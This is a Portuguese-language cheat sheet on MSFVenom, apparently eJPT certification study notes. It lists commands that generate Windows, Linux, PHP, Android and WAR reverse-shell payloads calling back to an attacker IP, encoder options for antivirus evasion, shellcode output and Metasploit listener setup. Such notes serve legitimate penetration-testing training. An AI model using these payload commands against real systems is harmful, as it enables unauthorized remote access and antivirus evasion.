
## Visão Geral

**MSFVenom** é uma ferramenta do **Metasploit Framework** usada para gerar **payloads** maliciosos em diferentes formatos.  
Ela combina as funcionalidades antigas do `msfpayload` e `msfencode` em um único utilitário.

Principais usos:

- Gerar reverse shells
    
- Criar executáveis maliciosos
    
- Gerar payloads para web exploits
    
- Bypass simples de antivírus (com encoders)
    
- Payloads para Windows, Linux, Android, etc.
    

---

## Estrutura Básica do Comando

```
msfvenom -p <payload> LHOST=<ip> LPORT=<porta> -f <formato> -o <arquivo>
```

Exemplo:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
```

---

## Parâmetros Principais

|Parâmetro|Função|
|---|---|
|-p|Define o payload|
|LHOST|IP do atacante|
|LPORT|Porta de conexão|
|-f|Formato de saída|
|-o|Nome do arquivo|
|-e|Encoder|
|-i|Número de vezes que codifica|
|-b|Bad characters|
|--list|Listar opções|

---

## Listar Payloads

```
msfvenom --list payloads
```

---

## Listar Formatos Disponíveis

```
msfvenom --list formats
```

Exemplos:

- exe
    
- elf
    
- raw
    
- asp
    
- aspx
    
- war
    
- php
    
- python
    
- bash
    

---

## Payloads Comuns

### Windows Meterpreter Reverse TCP

```
windows/meterpreter/reverse_tcp
```

### Windows Shell Simples

```
windows/shell_reverse_tcp
```

### Linux Reverse Shell

```
linux/x86/meterpreter/reverse_tcp
```

### PHP Reverse Shell

```
php/meterpreter_reverse_tcp
```

---

## Gerar Payload Windows

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
```

---

## Gerar Payload Linux

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o payload.elf
```

---

## Gerar Payload PHP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php
```

---

## Gerar Payload Android

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o app.apk
```

---

## Encoders

Encoders ajudam a evitar detecção simples.

Listar encoders:

```
msfvenom --list encoders
```

Exemplo:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe
```

- `-e` → encoder
    
- `-i` → número de iterações
    

---

## Bad Characters

Evitar bytes problemáticos:

```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -b "\x00\x0a\x0d" -f exe -o shell.exe
```

---

## Gerar Shellcode

```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f c
```

Formatos úteis:

- c
    
- python
    
- powershell
    
- java
    

---

## Listener no Metasploit

Após gerar payload:

```
msfconsole
```

```
use exploit/multi/handler
```

```
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

---

## Fluxo Completo

1. Gerar payload
    
2. Configurar listener
    
3. Entregar payload
    
4. Aguardar conexão
    
5. Obter shell
    

---

## Tipos de Payload

### Staged

Divide payload em partes  
Exemplo:

```
windows/meterpreter/reverse_tcp
```

### Stageless

Payload completo  
Exemplo:

```
windows/meterpreter_reverse_tcp
```

Diferença:

- Staged → menor tamanho
    
- Stageless → mais estável
    

---

## Formatos de Saída Comuns

|Formato|Uso|
|---|---|
|exe|Windows|
|elf|Linux|
|asp|IIS|
|aspx|IIS|
|war|Tomcat|
|php|Web|
|raw|Shellcode|
|ps1|PowerShell|

---

## Exemplos Importantes para eJPT

### Reverse shell Windows

```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
```

### Web shell PHP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php
```

### WAR para Tomcat

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war
```

---

## Dicas Importantes

- Sempre verificar IP correto
    
- Confirmar porta aberta
    
- Usar stageless quando possível
    
- Encoders não garantem bypass AV
    
- Listener deve estar ativo antes da execução
    

---

## Erros Comuns

- LHOST errado
    
- Porta bloqueada por firewall
    
- Payload incompatível com arquitetura
    
- Listener não iniciado
    
- Formato errado (exe em Linux, por exemplo)
    

---

## Arquiteturas

Especificar manualmente:

```
-a x86
-a x64
```

Exemplo:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
```

---

## Resumo Rápido

MSFVenom é usado para gerar payloads personalizados. Permite escolher sistema, formato e tipo de shell. Após gerar o payload, é necessário configurar um listener no Metasploit para receber a conexão reversa.

---